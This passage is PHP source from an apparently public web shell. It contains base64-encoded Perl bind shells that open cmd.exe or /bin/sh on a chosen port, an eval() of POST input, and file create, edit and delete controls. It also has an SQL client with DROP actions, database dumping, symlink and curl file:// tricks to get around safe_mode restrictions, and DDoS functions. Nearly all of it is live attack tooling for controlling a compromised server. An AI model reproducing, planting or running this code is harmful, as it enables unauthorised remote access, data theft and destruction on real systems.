$wbp="dXNlIFNvY2tldDsKJHBvcnQJPSAkQVJHVlswXTsKJHByb3RvCT0gZ2V0cHJvdG9ieW5hbWUoJ3Rj
cCcpOwpzb2NrZXQoU0VSVkVSLCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKTsKc2V0c29j
a29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JFVVNFQUREUiwgcGFjaygibCIsIDEpKTsKYmlu
ZChTRVJWRVIsIHNvY2thZGRyX2luKCRwb3J0LCBJTkFERFJfQU5ZKSk7Cmxpc3RlbihTRVJWRVIs
IFNPTUFYQ09OTik7CmZvcig7ICRwYWRkciA9IGFjY2VwdChDTElFTlQsIFNFUlZFUik7IGNsb3Nl
IENMSUVOVCkKewpvcGVuKFNURElOLCAiPiZDTElFTlQiKTsKb3BlbihTVERPVVQsICI+JkNMSUVO
VCIpOwpvcGVuKFNUREVSUiwgIj4mQ0xJRU5UIik7CnN5c3RlbSgnY21kLmV4ZScpOwpjbG9zZShT
VERJTik7CmNsb3NlKFNURE9VVCk7CmNsb3NlKFNUREVSUik7Cn0g";
$opwb=fopen("wbp.pl","w");
fwrite($opwb,base64_decode($wbp));
fclose($opwb);
echo getcwd();
system("perl wbp.pl $wb") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}
function lbp($wb){
$lbp="IyEvdXNyL2Jpbi9wZXJsCnVzZSBTb2NrZXQ7JHBvcnQ9JEFSR1ZbMF07JHByb3RvPWdldHByb3Rv
YnluYW1lKCd0Y3AnKTskY21kPSJscGQiOyQwPSRjbWQ7c29ja2V0KFNFUlZFUiwgUEZfSU5FVCwg
U09DS19TVFJFQU0sICRwcm90byk7c2V0c29ja29wdChTRVJWRVIsIFNPTF9TT0NLRVQsIFNPX1JF
VVNFQUREUiwgcGFjaygibCIsIDEpKTtiaW5kKFNFUlZFUiwgc29ja2FkZHJfaW4oJHBvcnQsIElO
QUREUl9BTlkpKTtsaXN0ZW4oU0VSVkVSLCBTT01BWENPTk4pO2Zvcig7ICRwYWRkciA9IGFjY2Vw
dChDTElFTlQsIFNFUlZFUik7IGNsb3NlIENMSUVOVCl7b3BlbihTVERJTiwgIj4mQ0xJRU5UIik7
b3BlbihTVERPVVQsICI+JkNMSUVOVCIpO29wZW4oU1RERVJSLCAiPiZDTElFTlQiKTtzeXN0ZW0o
Jy9iaW4vc2gnKTtjbG9zZShTVERJTik7Y2xvc2UoU1RET1VUKTtjbG9zZShTVERFUlIpO30g";
$oplb=fopen("lbp.pl","w");
fwrite($oplb,base64_decode($lbp));
fclose($oplb);
system("perl lbp.pl $wb") or die("I Can Not Execute Command For Back Connect Disable_functions Or Safe Mode");
}

if($_REQUEST['portbw']){
wbp($_REQUEST['portbw']);

}if($_REQUEST['portbl']){
lbp($_REQUEST['portbl']);
}
if($_REQUEST['ipcb'] && $_REQUEST['portbc']){
bcn($_REQUEST['ipcb'],$_REQUEST['portbc']);

}


function copyf($file1,$file2,$filename){
global $slash;
$fpc = fopen($file1, "rb");
$source = '';
while (!feof($fpc)) {
$source .= fread($fpc, 8192);
}
fclose($fpc);
$opt = fopen($file2.$slash.$filename, "w");
fwrite($opt, $source);
fclose($opt);
}
if ($_REQUEST['copyname'] && $_REQUEST['cpyto']){
if(is_writable($_REQUEST['cpyto'])){
echo $_REQUEST['address'];
copyf($_REQUEST['address'].$slash.$_REQUEST['copyname'],$_REQUEST['cpyto'],$_REQUEST['copyname']);
}else{alert("Permission Denied !");}}
if($_REQUEST['cfilename']){

echo $head.$formp.$nowaddress.'<p align="center"><b>Create File</b><br><textarea rows="19" name="nf4cs" cols="87"></textarea><br><input value="'.$_REQUEST['cfilename'].'" name=nf4c size=50><br><input type=submit value="  Create  "></form>'.$end;exit;
}

if($_REQUEST['nf4c'] && $_REQUEST['nf4cs']){
if($ofile4c=fopen($_REQUEST['nf4c'],"w")){
fwrite($ofile4c,$_REQUEST['nf4cs']);
fclose($ofile4c);
alert("File Saved !");}else{alert("Permission Denied !");}}

function sqlclienT(){
global $t,$errorbox,$et,$hcwd;
if(!empty($_REQUEST['serveR']) && !empty($_REQUEST['useR']) && isset($_REQUEST['pasS']) && !empty($_REQUEST['querY'])){
$server=$_REQUEST['serveR'];$type=$_REQUEST['typE'];$pass=$_REQUEST['pasS'];$user=$_REQUEST['useR'];$query=$_REQUEST['querY'];
$db=(empty($_REQUEST['dB']))?'':$_REQUEST['dB'];
$_SESSION[server]=$_REQUEST['serveR'];$_SESSION[type]=$_REQUEST['typE'];$_SESSION[pass]=$_REQUEST['pasS'];$_SESSION[user]=$_REQUEST['useR'];

}

if (isset ($_GET[select_db])){
	$getdb=$_GET[select_db];
	$_SESSION[db]=$getdb;
	$query="SHOW TABLES";
	$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
}
elseif (isset ($_GET[select_tbl])){
	$tbl=$_GET[select_tbl];
	$_SESSION[tbl]=$tbl;
	$query="SELECT * FROM `$tbl`";
	$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
}
elseif (isset ($_GET[drop_db])){
	$getdb=$_GET[drop_db];
	$_SESSION[db]=$getdb;
	$query="DROP DATABASE `$getdb`";
	querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],'',$query);
	$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],'','SHOW DATABASES');
}
elseif (isset ($_GET[drop_tbl])){
	$getbl=$_GET[drop_tbl];
	$query="DROP TABLE `$getbl`";
	querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
	$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],'SHOW TABLES');
}
elseif (isset ($_GET[drop_row])){
	$getrow=$_GET[drop_row];
	$getclm=$_GET[clm];
	$query="DELETE FROM `$_SESSION[tbl]` WHERE $getclm='$getrow'";
	$tbl=$_SESSION[tbl];
	querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],$query);
	$res=querY($_SESSION[type],$_SESSION[server],$_SESSION[user],$_SESSION[pass],$_SESSION[db],"SELECT * FROM `$tbl`");
}
else
	$res=querY($type,$server,$user,$pass,$db,$query);

if($res){
$res=htmlspecialchars($res);
$row=array ();
$title=explode('[+][+][+]',$res);
$trow=explode('[-][-][-]',$title[1]);
$row=explode('|+|+|+|+|+|',$title[0]);
$data=array();
$field=$trow[count($trow)-2];
if (strstr($trow[0],'Database')!='')
	$obj='db';
elseif (substr($trow[0],0,6)=='Tables')
	$obj='tbl';
else
	$obj='row';
$i=0;
foreach ($row as $a){
if($a!='')
$data[$i++]=explode('|-|-|-|-|-|',$a);
}

echo "<table border=1 bordercolor='#C6C6C6' cellpadding='2' bgcolor='EAEAEA' width='100%' style='border-collapse: collapse'><tr>";
foreach ($trow as $ti)
echo "<td bgcolor='F2F2F2'>$ti</td>";
echo "</tr>";
$j=0;
while ($data[$j]){
	echo "<tr>";
	foreach ($data[$j++] as $dr){
		echo "<td>";
		if($obj!='row') echo "<a href='$_SERVER[PHP_SELF]?do=db&select_$obj=$dr'>";
		echo $dr;
		if($obj!='row') echo "</a>";
		echo "</td>";
	}
	echo "<td><a href='$_SERVER[PHP_SELF]?do=db&drop_$obj=$dr";
	if($obj=='row')
		echo "&clm=$field";
	echo "'>Drop</a></td></tr>";
}
echo "</table><br>";

}





if(empty($_REQUEST['typE']))$_REQUEST['typE']='';
echo "<center><form name=client method='POST' action='$_SERVER[PHP_SELF]?do=db'><table border='1' width='400' style='border-collapse: collapse' id='table1' bordercolor='#C6C6C6' cellpadding='2'><tr><td width='400' colspan='2' bgcolor='#F2F2F2'><p align='center'><b><font face='Arial' size='2' color='#433934'>Connect to Database</font></b></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>DB Type:</font></td><td width='250' bgcolor='#EAEAEA'><select name=typE><option valut=MySQL  onClick='document.client.serveR.disabled = false;' ";
if ($_REQUEST['typE']=='MySQL')echo 'selected';
echo ">MySQL</option><option valut=MSSQL onClick='document.client.serveR.disabled = false;' ";
if ($_REQUEST['typE']=='MSSQL')echo 'selected';
echo ">MSSQL</option><option valut=Oracle onClick='document.client.serveR.disabled = true;' ";
if ($_REQUEST['typE']=='Oracle')echo 'selected';
echo ">Oracle</option><option valut=PostgreSQL onClick='document.client.serveR.disabled = false;' ";
if ($_REQUEST['typE']=='PostgreSQL')echo 'selected';
echo ">PostgreSQL</option><option valut=DB2 onClick='document.client.serveR.disabled = false;' ";
if ($_REQUEST['typE']=='DB2')echo 'selected';
echo ">IBM DB2</option></select></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Server Address:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text value='";
if (!empty($_REQUEST['serveR'])) echo htmlspecialchars($_REQUEST['serveR']);else echo 'localhost';
echo "' name=serveR size=35></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Username:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text name=useR value='";
if (!empty($_REQUEST['useR'])) echo htmlspecialchars($_REQUEST['useR']);else echo 'root';
echo "' size=35></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Password:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text value='";
if (isset($_REQUEST['pasS'])) echo htmlspecialchars($_REQUEST['pasS']);else echo '123';
echo "' name=pasS size=35></td></tr><tr><td width='400' colspan='2' bgcolor='#F2F2F2'><p align='center'><b><font face='Arial' size='2' color='#433934'>Submit a Query</font></b></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>DB Name:</font></td><td width='250' bgcolor='#EAEAEA'><input type=text value='";
if (!empty($_REQUEST['dB'])) echo htmlspecialchars($_REQUEST['dB']);
echo "' name=dB size=35></td></tr><tr><td width='150' bgcolor='#EAEAEA'><font face='Arial' size='2'>Query:</font></td><td width='250' bgcolor='#EAEAEA'><textarea name=querY rows=5 cols=27>";
if (!empty($_REQUEST['querY'])) echo htmlspecialchars(($_REQUEST['querY']));else echo 'SHOW DATABASES';
echo "</textarea></td></tr><tr><td width='400' colspan='2' bgcolor='#EAEAEA'>$hcwd<input class=buttons type=submit value='Submit' style='float: right'></td></tr></table></form>$et</center>";
}


function querY($type,$host,$user,$pass,$db='',$query){
$res='';
switch($type){
case 'MySQL':
if(!function_exists('mysql_connect'))return 0;
$link=mysql_connect($host,$user,$pass);
if($link){
if(!empty($db))mysql_select_db($db,$link);
$result=mysql_query($query,$link);
if ($result!=1){
while($data=mysql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<mysql_num_fields($result);$i++)
$res.=mysql_field_name($result,$i).'[-][-][-]';
}
mysql_close($link);
return $res;
}
break;
case 'MSSQL':
if(!function_exists('mssql_connect'))return 0;
$link=mssql_connect($host,$user,$pass);
if($link){
if(!empty($db))mssql_select_db($db,$link);
$result=mssql_query($query,$link);
while($data=mssql_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<mssql_num_fields($result);$i++)
$res.=mssql_field_name($result,$i).'[-][-][-]';
mssql_close($link);
return $res;
}
break;
case 'Oracle':
if(!function_exists('ocilogon'))return 0;
$link=ocilogon($user,$pass,$db);
if($link){
$stm=ociparse($link,$query);
ociexecute($stm,OCI_DEFAULT);
while($data=ocifetchinto($stm,$data,OCI_ASSOC+OCI_RETURN_NULLS))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<oci_num_fields($stm);$i++)
$res.=oci_field_name($stm,$i).'[-][-][-]';
return $res;
}
break;
case 'PostgreSQL':
if(!function_exists('pg_connect'))return 0;
$link=pg_connect("host=$host dbname=$db user=$user password=$pass");
if($link){
$result=pg_query($link,$query);
while($data=pg_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<pg_num_fields($result);$i++)
$res.=pg_field_name($result,$i).'[-][-][-]';
pg_close($link);
return $res;
}
break;
case 'DB2':
if(!function_exists('db2_connect'))return 0;
$link=db2_connect($db,$user,$pass);
if($link){
$result=db2_exec($link,$query);
while($data=db2_fetch_row($result))$res.=implode('|-|-|-|-|-|',$data).'|+|+|+|+|+|';
$res.='[+][+][+]';
for($i=0;$i<db2_num_fields($result);$i++)
$res.=db2_field_name($result,$i).'[-][-][-]';
db2_close($link);
return $res;
}
break;
}
return 0;
}
function bywsym($file){
if(!function_exists('symlink')){echo "Function Symlink Not Exist";}

if(!is_writable("."))
	die("not writable directory");
$level=0;
for($as=0;$as<$fakedep;$as++){
	if(!file_exists($fakedir))
		mkdir($fakedir);
	chdir($fakedir);
}
while(1<$as--) chdir("..");
$hardstyle = explode("/", $file);
for($a=0;$a<count($hardstyle);$a++){
	if(!empty($hardstyle[$a])){
		if(!file_exists($hardstyle[$a]))
			mkdir($hardstyle[$a]);
		chdir($hardstyle[$a]);
		$as++;
}}
$as++;
while($as--)
	chdir("..");
@rmdir("fakesymlink");
@unlink("fakesymlink");
@symlink(str_repeat($fakedir."/",$fakedep),"fakesymlink");
while(1)
	if(true==(@symlink("fakesymlink/".str_repeat("../",$fakedep-1).$file, "symlink".$num))) break;
	else $num++;
@unlink("fakesymlink");
mkdir("fakesymlink");
}
function bypcu($file){
$level=0;

if(!file_exists("file:"))
	mkdir("file:");
chdir("file:");
$level++;

$hardstyle = explode("/", $file);

for($a=0;$a<count($hardstyle);$a++){
	if(!empty($hardstyle[$a])){
		if(!file_exists($hardstyle[$a]))
			mkdir($hardstyle[$a]);
		chdir($hardstyle[$a]);
		$level++;
	}
}

while($level--) chdir("..");

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, "file:file:///".$file);

echo '<FONT COLOR="RED"> <textarea rows="40" cols="120">';

if(FALSE==curl_exec($ch))
	die('>Sorry... File '.htmlspecialchars($file).' doesnt exists or you dont have permissions.');

echo ' </textarea> </FONT>';

curl_close($ch);
}
if ($_REQUEST['bypcu']){
bypcu($_REQUEST['bypcu']);
}

function printdrive(){
global $slash;
foreach (range("A","Z") as $tempdrive) {
if (is_dir($tempdrive.":".$slash)){
$adri=$tempdrive.":".$slash;
$drivea=$drivea.'<a href="?address='.$adri.'"><b><font size=3>'.$tempdrive.':'.$slash.'</a><font color=green> - </font></b></font>';
}
}
return $drivea;
}
if($_POST['nameren'] && $_POST['addressren']){
if(is_writable($_REQUEST['addressren'])){

rename($_POST['addressren'],$_POST['nameren']);alert("Rename Successful !");
}else{alert("Permission Denied !");}
}
if($_GET['do']=="delete"){

if ($_GET['type']=="dir"){
if(is_writable($_REQUEST['address'])){
$dir=$_GET['address'].$_GET['filename'];
deleteDirectory($dir);
alert("Deleted Successful !");
}else{alert("Permission Denied !");}
}elseif($_GET['type']=="file"){
if(is_writable($_GET['address'].$_GET['filename'])){
unlink($_GET['address'].$_GET['filename']);alert("Deleted Successful !");
}else{alert("Permission Denied !");}
}
}
if($_POST['fedit'] && $_POST['namefe']){
if(is_writable($_REQUEST['address'])){


$opensave=fopen($_POST['address'].$slash.$_POST['namefe'],"w");
fwrite($opensave,html_entity_decode($_POST['fedit']));
fclose($opensave);alert("File Saved Successful !");
}else{alert("Permission Denied !");}
}
if ($_POST['evalsource']){

eval($_POST['evalsource']);
}

if($_GET['do']=="info"){

if(ini_get('register_globals')){
$registerg="Enable";
}else{
$registerg="OFF";
}
if(extension_loaded('curl')){
$curls="ON";
}else{
$curls="OFF";
}
if(@function_exists('mysql_connect')){
$db_on = "Mysql : On";
};
if(@function_exists('mssql_connect')){
$db_on = "Mssql : On";
};
if(@function_exists('pg_connect')){
$db_on = "PostgreSQL : On";
};if(@function_exists('ocilogon')){
$db_on = "Oracle : On";
};
$id = @exec('id');
if (!empty($id)){ $ff=$id; }else $ff= "user=".@get_current_user()." uid=".@getmyuid()." gid=".@getmygid();
echo $head."<font face='' size='2'><p style='max-width: 550px;'>
<font color=red>This page : </font>".htmlentities(__FILE__, ENT_QUOTES, 'UTF-8')."<br>
<font color=red>ID : </font>".$ff."<br>
<font color=red>your_ip : </font>".$_SERVER['REMOTE_ADDR']."<br>
<font color=red>OS : </font>".php_uname(s)."
<font color=red>Machine name : </font>".php_uname(n)."
<font color=red>Kernel Release : </font>".php_uname(r)."
<font color=red>Kernel Version : </font>".php_uname(v)."
<font color=red>Machine : </font>".php_uname(m)."<br>
<font color=red>Server Name : </font>".$_SERVER['HTTP_HOST']."<br>
<font color=red>Admin Server : </font>".$_SERVER['SERVER_ADMIN']."<br>
<font color=red>Server port : </font>".htmlentities($_SERVER['SERVER_PORT'], ENT_QUOTES, 'UTF-8')."<br>
<font color=red>server_ip : </font>".gethostbyname($_SERVER["HTTP_HOST"])."<br>
<font color=red>server_software : </font>".getenv("SERVER_SOFTWARE")."<br>
<font color=red>Php Version : </font>".phpversion()."<br>
<font color=red>Zend : </font>".htmlentities(zend_version(), ENT_QUOTES, 'UTF-8')."<br>
<font color=red>Disable_Functions : </font>".$disablef."<br>
<font color=red>Safe_Mode : </font>".$safe_modes."<br>
<font color=red>Openbase_dir : </font>".ini_get('openbase_dir')."<br>
<font color=red>Free Space : </font>".sizee(disk_free_space("/"))."<br>
<font color=red>Total Space : </font>".sizee(disk_total_space("/"))."<br>
<font color=red>Register_Globals : </font>".$registerg."<br>
<font color=red>Curl : </font>".$curls."<br>
<font color=red>Oracle : </font>".$Oracle2=function_exists('ocilogon')?("<font color='red'>ON</font>"):("OFF")."<br>
<font color=red>MySQL : </font>".$MySQL2=function_exists('mysql_connect')?("<font color='red'>ON</font>"):("OFF")."<br>
<font color=red>MSSQL : </font>".$MSSQL2=function_exists('mssql_connect')?("<font color='red'>ON</font>"):("OFF")."<br>
<font color=red>PostgreSQL : </font>".$pg_connect2=function_exists('pg_connect')?("<font color='red'>ON</font>"):("OFF")."<br>
<font color=red>disabled_functions : </font>".$r=ini_get('disable_functions') ? ini_get('disable_functions'):'none'."<br>
<font color=red>Extensiones cargadas : </font>".htmlentities(implode(', ',get_loaded_extensions()), ENT_QUOTES, 'UTF-8')."<br>
<font color=red>Loaded Apache modules : </font>".implode(', ', apache_get_modules())."<br>
</p></font>".$end;
exit;
}
if($_GET['do']=="dd0s"){
echo $head.$formg.$nowaddress.'<p align="center">Address : <input name=urldd0 size=50> Time : <input name=timedd0 size=6 value=40000><br><input type=submit value="  DDoS  "></form></p>'.$end;exit;
}
if($_GET['do']=="killme")
{
setcookie('name', '', time() - 3600);
setcookie('pass', '', time() - 3600);
header('Location:?');
}
if($_REQUEST['do']=='about'){
echo $head."<center><p align='center'>
<b><font color=red>
".$logotxt."</b></font>
Version 18.09.Build.1.(beta)<br>
Coded By : yasserbdj96<br><br></center>
<font color=red>Update : 2018/09/18</font><br>
-design new theme (blackarch theme)& fix last theme error.<br><br>
<font color=red>Update : 2017/12/21</font><br>
-fix Upload error.<br>
-fix download file error.<br>
-fix sha1 convert.<br>
-add more information.<br>
-add image convert (base64).<br>
-add login system.<br>
-design new theme (Algeria theme).<br>
-fix text convert (big text is converted now).<br>
<b><center><br><font color=red>Built on iTSecTeam.</font></center></b>
".$end;exit;
}

if($_GET['do']=="imgconvert"){
echo $head.'<center><br><form action="" method="post" enctype="multipart/form-data">
<input  type="file" name="file1"><br>
<input type="submit" value="convert" name="convert"></div>
</form>';

if(isset($_POST['convert'])){
Function yasser($a){

$explode = explode('.', $a['name']);
$ext = $explode[count($explode) - 1];
if(($ext != 'png')and($ext != 'jpg')and($ext != 'gif')and($ext != 'jpeg')){ echo "Only PNG,JPG,GIF and JPEG images can be converted"; exit();}
if(is_uploaded_file($a['tmp_name'])){
$result = move_uploaded_file($a['tmp_name'],''.basename($a['name']));
echo $result === true ? 'File converted successfuly':'Thereare some errors';
/**/
$imgdata=base64_encode(file_get_contents($a['name']));
$src='data:'.mime_content_type($a['name']).';base64,'.$imgdata;
echo '<br><img style="width:25%" src="'.$src.'"><br><br>';
echo '<textarea rows="19" name="fedit" cols="87">'.$src.'</textarea>';
unlink ($a['name']);
}
else{
echo 'No File converted';}
}
yasser($_FILES['file1']);}
echo '</center>'.$end;exit;}


if ($_GET['dosthisserver']=="1"){
function dosserver(){
$junk=str_repeat("99999999999999999999999999999999999999999999999999",99999);
for($i=0;$i<2;){
$buff=bcpow($junk, '3', 2);
$buff=null;
}
}
dosserver();
}
if ($_GET['dosthisserver']=="2"){
function cx(){cx();}
 cx();
}
if (($_GET['do']=="convert")OR($_POST['do']=="convert")){
$hash=null;
if ($_POST['stringtoh'] && $_POST['hashtoh']=='md5'){
$hash=md5($_POST['stringtoh']);
}elseif ($_POST['stringtoh'] && $_POST['hashtoh']=='sha1'){
$hash=sha1($_POST['stringtoh']);
}elseif ($_POST['stringtoh'] && $_POST['hashtoh']=='crc32'){
$hash=crc32($_POST['stringtoh']);
}elseif ($_POST['stringtoh'] && $_POST['hashtoh']=='b64e'){
$hash=base64_encode($_POST['stringtoh']);
}elseif ($_POST['stringtoh'] && $_POST['hashtoh']=='b64d'){
$hash=base64_decode($_POST['stringtoh']);
}
echo $head.'
<form method=post action="'.$me.'">
<p align="center">Convert<br><table><tr>
<input type=hidden name=do value=convert>
<textarea cols=60 rows=10 name=stringtoh></textarea><br>
<select name=hashtoh>
<option value="md5">MD5</option>
<option value="crc32">CRC32</option>
<option value="sha1">SHA1</option>
<option value="b64e">Base64 Encode!</option>
<option value="b64d">Base64 Decode!</option></tr><tr><br>
<br><textarea cols=60 rows=10 >'.$hash.'</textarea></tr><br><input type=submit value="Convert">
</table>

</p></form>'.$end;exit;}
if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){
$date = date("Y-m-d");
$dbserver = $_POST['server'];
$dbuser = $_POST['username'];
$dbpass = $_POST['password'];
$dbname = $_POST['dbname'];
$file = "Dump-$dbname-$date";
$method = $_POST['method'];
if ($method=='sql'){
$file="Dump-$dbname-$date.sql";
$fp=fopen($file,"w");
}else{
$file="Dump-$dbname-$date.sql.gz";
$fp = gzopen($file,"w");
}
function write($data) {
global $fp;
if ($_POST['method']=='sql'){
fwrite($fp,$data);
}else{
gzwrite($fp, $data);
}}
mysql_connect ($dbserver, $dbuser, $dbpass);
mysql_select_db($dbname);
$tables = mysql_query ("SHOW TABLES");
while ($i = mysql_fetch_array($tables)) {
    $i = $i['Tables_in_'.$dbname];
    $create = mysql_fetch_array(mysql_query ("SHOW CREATE TABLE ".$i));
    write($create['Create Table'].";\n\n");
    $sql = mysql_query ("SELECT * FROM ".$i);
    if (mysql_num_rows($sql)) {
        while ($row = mysql_fetch_row($sql)) {
            foreach ($row as $j => $k) {
                $row[$j] = "'".mysql_escape_string($k)."'";
            }
            write("INSERT INTO $i VALUES(".implode(",", $row).");\n");
        }
    }
}
if ($method=='sql'){
fclose ($fp);
}else{
gzclose($fp);}
header("Content-Disposition: attachment; filename=" . $file);
header("Content-Type: application/download");
header("Content-Length: " . filesize($file));
flush();

$fp = fopen($file, "r");
while (!feof($fp))
{
    echo fread($fp, 65536);
    flush();
}
fclose($fp);
}

/* if($_GET['do']=="edit"){
if($_GET['filename']=="dir"){
if(is_readable($_GET['address'])){
chdir($_GET['address']);}else{alert("Permission Denied !");}

}} */




$araddresss=explode($slash,getcwd());
$matharrayy=count($araddresss)-1;
$addr1backk=str_replace($araddresss[$matharrayy],"",$araddresss);
for($countback=0;$countback<count($addr1backk);$countback++){
$arraybacke[$countback]=$slash.$addr1backk[$countback];
$backdirunixx=$backdirunixx.$slash.$addr1backk[$countback];
}
if ($slash=="\\"){
$countback=null;
$backdirwin=null;
for($countback=1;$countback<count($addr1backk);$countback++){
$backdirwin=$backdirwin."\\".$addr1backk[$countback];}
$backdirwin=$addr1backk[0].$backdirwin;
$backaddresss=$backdirwin;
}else{
$countback=null;
$backdirwin=null;
for($countback=1;$countback<count($addr1backk);$countback++){
$backdirwin=$backdirwin."/".$addr1backk[$countback];}
$backdirwin=$addr1backk[0].$backdirwin;
$backaddresss=$backdirwin;
$backaddresss=str_replace("\\","/",$backaddresss);
}
function calc_dir_size($path)
{
$size = 0;
if ($handle = opendir($path))
{
while (false !== ($entry = readdir($handle)))
{
$current_path = $path . '/' . $entry;
if ($entry != '.' && $entry != '..' && !is_link($current_path))
{
if (is_file($current_path))
$size += filesize($current_path);
elseif (is_dir($current_path))
$size = calc_dir_size($current_path);
}
}
}
closedir($handle);
return $size;
}
function openf($parsef){
global $basep,$slash;

if(strlen(strpos(getcwd(),$basep))>=1){
$rr=str_replace($basep,"",getcwd());
$rr=str_replace("\\","/",$rr);
$diropen='<a href="'.$rr."/".$parsef.'">'.$parsef.'</a>';
}else{
$diropen='<a href="?do=edit&address='.getcwd().$slash.'&filename='.$parsef.'">'.$parsef.'</a>';
}
return $diropen;
}
if ($_GET['address']){$ifget=$_GET['address'];}if($_POST['address']){$ifget=$_POST['address'];}
if($cwd==''){$cwd=getcwd();}$nowaddress='<input type=hidden name=address value="'.$cwd.'">';
$ad=getcwd();
$hand=opendir("$ad");
$coi=0;
$coi2=0;

while (false !== ($fileee = readdir($hand))) {
        if ($fileee != "." && $fileee != "..") {
		if (filetype($fileee)=="dir"){
		if ($coi %2){
$colort='"#e7e3de"';
}else{
$colort='"#e4e1de"';

}
$coi++;
$fil=$fil.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 0px" bordercolor="#CDCDCD" bgcolor='.$colort.' width="950" height="1" dir="ltr">
<tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';"><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="" style="font-size: 9pt"><img style="width:12px" src="data:image/png;base64,' .$picdir. '" /> <a href="?address='.$cwd.$slash.$fileee.$slash.'">'.$fileee.'</b></span></td>
<td valign="top" height="19" width="65"><font face="" style="font-size: 9pt">'.date("y/m/d", filectime($fileee)).'</td><td valign="top" height="19" width="30"><font face="" style="font-size: 9pt">'.substr(sprintf('%o', fileperms($cwd.$slash."$fileee")), -3).'</td><td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"></td><td valign="top" height="19" width="22"><font face="" style="font-size: 9pt"><a href="?do=down&type=dir&address='.$cwd.$slash.'&dirname='.$fileee.'"><center>Dow</center></a></td><td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"><a href="?do=rename&address='.$cwd.$slash.'&filename='.$fileee.'"><center>Ren</center></a></td>
<td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"><a href="?do=delete&type=dir&address='.$cwd.$slash.'&filename='.$fileee.'"><center>Del</center></a></td></tr></table>'
;}
else{

		if ($coi2 %2){
$colort='"#e7e3de"';
}else{
$colort='"#e4e1de"';
}
$coi2++;
$file=$file.'<table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 0px" bordercolor="#CDCDCD" bgcolor='.$colort.' width="950" height="20" dir="ltr">
<tr onmouseover="this.className=\'focus\';" onmouseout="this.className=\''.$oo.'\';"><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="" style="font-size: 9pt"><img style="width:13px" src="data:image/png;base64,' .$picfile. '" /> '.openf($fileee).'</span></td>
<td valign="top" height="19" width="80"><font face="" style="font-size: 9pt">'.sizee(filesize($fileee)).'</td><td valign="top" height="19" width="65"><font face="" style="font-size: 9pt">'.date("y/m/d", filectime($fileee)).'</td><td valign="top" height="19" width="30"><font face="" style="font-size: 9pt">'.substr(sprintf('%o', fileperms($cwd.$slash."$fileee")), -3).'</td><td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"><a href="?do=edit&address='.$cwd.$slash.'&filename='.$fileee.'"><center>Edit</center></a></td><td valign="top" height="19" width="23"><font face="" style="font-size: 9pt"><a href="?do=down&type=file&address='.$cwd.$slash.'&filename='.$fileee.'"><center>Dow</center></a></td><td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"><a href="?do=rename&address='.$cwd.$slash.'&filename='.$fileee.'"><center>Ren</center></a></td>
<td valign="top" height="19" width="30"><font face="" style="font-size: 9pt"><a href="?do=delete&type=file&address='.$cwd.$slash.'&filename='.$fileee.'"><center>Del</center></a></td></tr></table>'
;}
}
}
echo $head.'
<font face="" style="font-size: 6pt"><table cellpadding="0" cellspacing="0" style="border-style: dotted; border-width: 0px" bordercolor="#CDCDCD" width="950" height="20" dir="ltr">
<tr><td valign="top" height="19" width="842"><p align="left"><span lang="en-us"><font face="" style="font-size: 9pt"><font color=red>Now Directory : '.getcwd()."<br>".printdrive().'<br><a href="?do=back&address='.$backaddresss.'"><font color=#008000>Back</span></td>
</tr></table>'.$fil.$file.'</table>
<table border="0" width="950" style="border-collapse: collapse" id="table4" cellpadding="5">
<tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Change Dir : </font></td>
<td width="750" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:"><input name=address value='.getcwd().$slash.' size=50>
<input type=submit value=Change></form></td></tr>
<tr>
<td width="200" align="right" valign="top" style="border-left-width: 0px; border-right-width: 0px; border-top-width: 0px; border-bottom:">
<font face="" style="font-size: 10pt; font-weight:700"><br>'.$formg.'Create Dir : </font></td>
